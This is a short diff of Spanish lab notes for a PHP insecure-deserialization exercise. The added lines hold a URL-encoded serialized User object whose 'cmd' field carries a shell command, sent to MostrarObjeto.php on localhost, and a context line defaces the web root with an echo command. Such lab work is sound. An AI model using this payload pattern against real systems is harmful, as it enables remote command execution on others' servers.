@@ -191,6 +191,12 @@ A la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto s
 
 echo "El servidor ha sido hackeado" > /var/www/html/ServidorHackeado.tmp
 
+
+si da error capturas 12 y 13 es por http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A3%3A{s%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3Bs%3A3%3A%22cmd%22%3Bs%3A21%3A%22ls+-l+%2Ftmp%2Foutput.txt%22%3B}
+
+quitar mostrarobjeto1 y poner mostrarobjeto
+
+
 ----------------------------------------------------------
 
 
